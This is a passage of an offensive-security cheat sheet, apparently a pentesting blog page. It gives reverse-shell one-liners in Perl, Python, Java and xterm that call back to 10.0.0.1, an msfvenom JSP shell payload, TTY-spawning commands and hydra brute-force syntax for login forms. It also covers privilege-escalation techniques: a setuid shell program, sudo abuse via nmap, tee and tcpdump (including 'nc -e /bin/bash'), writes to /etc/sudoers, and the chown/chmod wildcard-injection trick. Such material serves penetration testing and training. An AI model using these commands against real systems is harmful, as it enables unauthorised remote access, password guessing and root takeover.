</pre></td><td class='code'><pre><code class=''><span class='line'>perl -e 'use Socket;$i=&ldquo;10.0.0.1&rdquo;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&ldquo;&gt;&amp;S&rdquo;);open(STDOUT,&ldquo;&gt;&amp;S&rdquo;);open(STDERR,&ldquo;&gt;&amp;S&rdquo;);exec(&ldquo;/bin/sh -i&rdquo;);};&rsquo;</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Python:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.0.0.1&rdquo;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Java:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>r = Runtime.getRuntime()
</span><span class='line'>p = r.exec([&ldquo;/bin/bash&rdquo;,&ldquo;-c&rdquo;,&ldquo;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done&rdquo;] as String[])
</span><span class='line'>p.waitFor()</span></code></pre></td></tr></table></div></figure>
</li>
<li>
JSP:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war &gt; runme.war</span></code></pre></td></tr></table></div></figure>
</li>
<li>
XTerm:
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xterm -display 10.0.0.1:1</span></code></pre></td></tr></table></div></figure>
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Xnest :1</span></code></pre></td></tr></table></div></figure>
You’ll need to authorise the target to connect to you (command also run on your host):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xhost +targetip</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>
</ul>
<li><strong>Spawning a TTY Shell</strong>:  <a href="http://netsec.ws/?p=337">Spawning a TTY Shell</a> and  <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> has provided multiple ways to get a tty shell
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</span></code></pre></td></tr></table></div></figure>
or
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;import os; os.system(&ldquo;/bin/bash&rdquo;)&rsquo;</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/sh -i</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>perl -e &lsquo;exec &ldquo;/bin/sh&rdquo;;&rsquo;</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>perl: exec &ldquo;/bin/sh&rdquo;;</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ruby: exec &ldquo;/bin/sh&rdquo;</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lua: os.execute(&lsquo;/bin/sh&rsquo;)</span></code></pre></td></tr></table></div></figure>
(From within IRB)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exec &ldquo;/bin/sh&rdquo;</span></code></pre></td></tr></table></div></figure>
(From within vi)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>:!bash</span></code></pre></td></tr></table></div></figure>
(From within vi)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>:set shell=/bin/bash:shell</span></code></pre></td></tr></table></div></figure>
(From within nmap)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>!sh</span></code></pre></td></tr></table></div></figure>
Using “Expect” To Get A TTY
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat sh.exp
</span><span class='line'>#!/usr/bin/expect
</span><span class='line'># Spawn a shell, then allow the user to interact with it.
</span><span class='line'># The new shell will have a good enough TTY to run tools like ssh, su and login
</span><span class='line'>spawn sh
</span><span class='line'>interact</span></code></pre></td></tr></table></div></figure> </li></p>

<p><li>Brute forcing:
hydra:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-l LOGIN              or -L FILE login with LOGIN name, or load several logins from FILE
</span><span class='line'>-p PASS               or -P FILE try password PASS, or load several passwords from FILE
</span><span class='line'>-U        service module usage details
</span><span class='line'>-e nsr additional checks, &ldquo;n&rdquo; for null password, &ldquo;s&rdquo; try login as pass, &ldquo;r&rdquo; try the reverse login as pass
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>
hydra http-post-form:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -U http-post-form
</span><span class='line'>
</span><span class='line'>Help for module http-post-form:
</span><span class='line'>============================================================================
</span><span class='line'>Module http-post-form requires the page and the parameters for the web form.
</span><span class='line'>
</span><span class='line'>By default this module is configured to follow a maximum of 5 redirections in
</span><span class='line'>a row. It always gathers a new cookie from the same URL without variables
</span><span class='line'>The parameters take three &ldquo;:&rdquo; separated values, plus optional values.
</span><span class='line'>(Note: if you need a colon in the option string as value, escape it with &ldquo;:&rdquo;, but do not escape a &ldquo;\&rdquo; with &ldquo;\&rdquo;.)
</span><span class='line'>
</span><span class='line'>Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]
</span><span class='line'>First is the page on the server to GET or POST to (URL).
</span><span class='line'>Second is the POST/GET variables (taken from either the browser, proxy, etc.
</span><span class='line'> with usernames and passwords being replaced in the &ldquo;^USER^&rdquo; and &ldquo;^PASS^&rdquo;
</span><span class='line'> placeholders (FORM PARAMETERS)
</span><span class='line'>Third is the string that it checks for an <em>invalid</em> login (by default)
</span><span class='line'> Invalid condition login check can be preceded by &ldquo;F=&rdquo;, successful condition
</span><span class='line'> login check must be preceded by &ldquo;S=&rdquo;.
</span><span class='line'> This is where most people get it wrong. You have to check the webapp what a
</span><span class='line'> failed string looks like and put it in this parameter!
</span><span class='line'>The following parameters are optional:
</span><span class='line'> C=/page/uri     to define a different page to gather initial cookies from
</span><span class='line'> (h|H)=My-Hdr: foo   to send a user defined HTTP header with each request
</span><span class='line'>                 ^USER^ and ^PASS^ can also be put into these headers!
</span><span class='line'>                 Note: &lsquo;h&rsquo; will add the user-defined header at the end
</span><span class='line'>                 regardless it&rsquo;s already being sent by Hydra or not.
</span><span class='line'>                 &lsquo;H&rsquo; will replace the value of that header if it exists, by the
</span><span class='line'>                 one supplied by the user, or add the header at the end
</span><span class='line'>Note that if you are going to put colons (:) in your headers you should escape them with a backslash ().
</span><span class='line'> All colons that are not option separators should be escaped (see the examples above and below).
</span><span class='line'> You can specify a header without escaping the colons, but that way you will not be able to put colons
</span><span class='line'> in the header value itself, as they will be interpreted by hydra as option separators.
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'> &ldquo;/login.php:user=^USER^&amp;pass=^PASS^:incorrect&rdquo;
</span><span class='line'> &ldquo;/login.php:user=^USER^&amp;pass=^PASS^&amp;colon=colon:escape:S=authlog=.<em>success&rdquo;
</span><span class='line'> &ldquo;/login.php:user=^USER^&amp;pass=^PASS^&amp;mid=123:authlog=.</em>failed&rdquo;
</span><span class='line'> &ldquo;/:user=^USER&amp;pass=^PASS^:failed:H=Authorization: Basic dT1w:H=Cookie: sessid=aaaa:h=X-User: ^USER^&rdquo;
</span><span class='line'> &ldquo;/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F&lt;target&gt;%2Fexchange&amp;flags=0&amp;username=&lt;domain&gt;%5C<sup>USER</sup>^&amp;password=^PASS^&amp;SubmitCreds=x&amp;trusted=0:reason=:C=/exchweb&rdquo;</span></code></pre></td></tr></table></div></figure>
</ul>
</li>
</ol></p>

<p><li><strong>Unprivileged shell to privileged shell:</strong>
<ol>
<li>Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.</p>

<p>Suid.c
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int main(void) {
</span><span class='line'>setgid(0); setuid(0);
</span><span class='line'>execl(“/bin/sh”,”sh”,0); }</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>
<strong>SUDO -l Permissions</strong>
<ul>
<li>
<strong>nmap suid</strong> shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script &lt;(echo &lsquo;require &ldquo;os&rdquo;.execute &ldquo;/bin/sh&rdquo;&rsquo;)</span></code></pre></td></tr></table></div></figure>
or
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap &ndash;interactive</span></code></pre></td></tr></table></div></figure>
</li>
<li>
If <strong>tee is suid</strong>: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any_script.sh, which can then be run as root by a user.
If some script is run as root, you may also run. For example, let&rsquo;s say tidy.sh is executed as root on the server, we can write the below code in temp.sh
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>temp.sh
</span><span class='line'>echo “milton ALL=(ALL) ALL” &gt; /etc/sudoers”
</span><span class='line'>
</span><span class='line'>or
</span><span class='line'>
</span><span class='line'>chmod +w /etc/sudoers to add write properties to sudoers file to do the above</span></code></pre></td></tr></table></div></figure>
and then
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</span></code></pre></td></tr></table></div></figure>
which will add contents of temp.sh to tidyup.sh.
</li>
<li><strong>tcpdump</strong>:
The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).</p>

<p>Create a temp.sh ( which contains the commands to executed as root )
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>id
</span><span class='line'>/bin/nc 192.168.110.1 4444 -e /bin/bash</span></code></pre></td></tr></table></div></figure>
Execute the command
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root</span></code></pre></td></tr></table></div></figure>
where
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   -C file_size
</span><span class='line'>          Before  writing a raw packet to a savefile, check whether the file is currently larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after the first savefile will have
</span><span class='line'>          the name specified with the -w flag, with a number after it, starting at 1 and continuing upward.  The units of file_size are millions of bytes (1,000,000 bytes, not 1,048,576 bytes).
</span><span class='line'>
</span><span class='line'>   -W     Used  in conjunction with the -C option, this will limit the number of files created to the specified number, and begin overwriting files from the beginning, thus creating a &lsquo;rotating&rsquo; buffer.  In addition,
</span><span class='line'>          it will name the files with enough leading 0s to support the maximum number of files, allowing them to sort correctly.
</span><span class='line'>
</span><span class='line'>          Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit. If used with -C as well, the behavior will result in
</span><span class='line'>          cyclical files per timeslice.
</span><span class='line'>
</span><span class='line'>   -z postrotate-command
</span><span class='line'>          Used in conjunction with the -C or -G options, this will make tcpdump run &ldquo; postrotate-command file &rdquo; where file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2
</span><span class='line'>          will compress each savefile using gzip or bzip2.
</span><span class='line'>
</span><span class='line'>          Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn&rsquo;t disturb the capture process.
</span><span class='line'>
</span><span class='line'>          And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the only argument, make the flags &amp;  argu‐
</span><span class='line'>          ments arrangements and execute the command that you want.
</span><span class='line'>
</span><span class='line'>   -Z user
</span><span class='line'>   &ndash;relinquish-privileges=user
</span><span class='line'>          If tcpdump is running as root, after opening the capture device or input savefile, but before opening any savefiles for output, change the user ID to user and the group ID to the primary group of user.
</span><span class='line'>
</span><span class='line'>          This behavior can also be enabled by default at compile time.</span></code></pre></td></tr></table></div></figure>
</li></p>

<p>More can be learn here <a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/</a>
</li>
</ul>
</li>
<li><strong>Unix Wildcards</strong>:
<ul>
The below text is directly from the <a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">DefenseCode_Unix_WildCards_Gone_Wild</a>
<li><strong>Chown file reference trick</strong> (file owner hijacking)</p>

<p>First really interesting target I&rsquo;ve stumbled across is &lsquo;chown&rsquo;. Let&rsquo;s say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to &lsquo;nobody&rsquo;. Pay attention to the file owners in the following files list.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 52
</span><span class='line'>drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
</span><span class='line'>drwx&mdash;&mdash;. 22 user user 4096 Oct 28 17:34 ..
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   66 Oct 28 17:36 admin.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   34 Oct 28 17:35 ado.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   80 Oct 28 17:44 config.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  201 Oct 28 17:35 download.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  225 Oct 28 17:35 header.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  117 Oct 28 17:35 inc.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon    0 Oct 28 17:45 &ndash;reference=.drf.php
</span><span class='line'>-rw-rw&mdash;-.  1 user user   66 Oct 28 17:35 password.inc.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   94 Oct 28 17:35 script.php</span></code></pre></td></tr></table></div></figure>
Files in this public directory are mostly owned by the user named &lsquo;user&rsquo;, and root user will now change that to &lsquo;nobody&rsquo;.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# chown -R nobody:nobody *.php</span></code></pre></td></tr></table></div></figure>
Let&rsquo;s see who owns files now&hellip;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 52
</span><span class='line'>drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
</span><span class='line'>drwx&mdash;&mdash;. 22 user user 4096 Oct 28 17:34 ..
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   66 Oct 28 17:36 admin.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   34 Oct 28 17:35 ado.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   80 Oct 28 17:44 config.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  201 Oct 28 17:35 download.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  225 Oct 28 17:35 header.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  117 Oct 28 17:35 inc.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon    0 Oct 28 17:45 &ndash;reference=.drf.php
</span><span class='line'>-rw-rw&mdash;-.  1 leon leon   66 Oct 28 17:35 password.inc.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   94 Oct 28 17:35 script.php</span></code></pre></td></tr></table></div></figure>
Something is not right&hellip; What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group &lsquo;nobody&rsquo;, but somehow, all files are owned by the user &lsquo;leon&rsquo; now.</p>

<p>If we take closer look, this directory previously contained just the following two files created and owned by the user &lsquo;leon&rsquo;.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon    0 Oct 28 17:45 &ndash;reference=.drf.php</span></code></pre></td></tr></table></div></figure>
Thing is that wildcard character used in &lsquo;chown&rsquo; command line took arbitrary &lsquo;&ndash;reference=.drf.php&rsquo; file and passed it to the chown command at the command line as an option.</p>

<p>Let&rsquo;s check chown manual page (man chown):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   &ndash;reference=RFILE
</span><span class='line'>          use RFILE&rsquo;s owner and group rather than specifying OWNER:GROUP values</span></code></pre></td></tr></table></div></figure>
So in this case, &lsquo;&ndash;reference&rsquo; option to &lsquo;chown&rsquo; will override &lsquo;nobody:nobody&rsquo; specified as the root, and new owner of files in this directory will be exactly same as the owner of &lsquo;.drf.php&rsquo;, which is in this case user &lsquo;leon&rsquo;. Just for the record, &lsquo;.drf&rsquo; is short for Dummy Reference File. :)</p>

<p>To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument to the &ndash;reference option, file that&rsquo;s owned by some other user, not &lsquo;leon&rsquo;, in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership
of files to arbitrary users, and practically &ldquo;hijack&rdquo; files that are of interest to us.</p>

<p>Even more, if user &lsquo;leon&rsquo; previously created a symbolic link in that directory that points to let&rsquo;s say /etc/shadow, ownership of /etc/shadow would also be changed to the user &lsquo;leon&rsquo;.
</li>
<li><strong>Chmod file reference trick</strong></p>

<p>Another interesting attack vector similar to previously described &lsquo;chown&rsquo; attack is &lsquo;chmod&rsquo;. Chmod also has &ndash;reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard.
Chmod manual page (man chmod):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   &ndash;reference=RFILE
</span><span class='line'>          use RFILE&rsquo;s mode instead of MODE values</span></code></pre></td></tr></table></div></figure>
Example is presented below.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 68
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
</span><span class='line'>drwx&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rw-rw-r&ndash;.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 29 00:41 &ndash;reference=.drf.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    94 Oct 28 17:38 script.php</span></code></pre></td></tr></table></div></figure>
Superuser will now try to set mode 000 on all files.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# chmod 000 *</span></code></pre></td></tr></table></div></figure>
Let&rsquo;s check permissions on files&hellip;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 68
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
</span><span class='line'>drwx&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
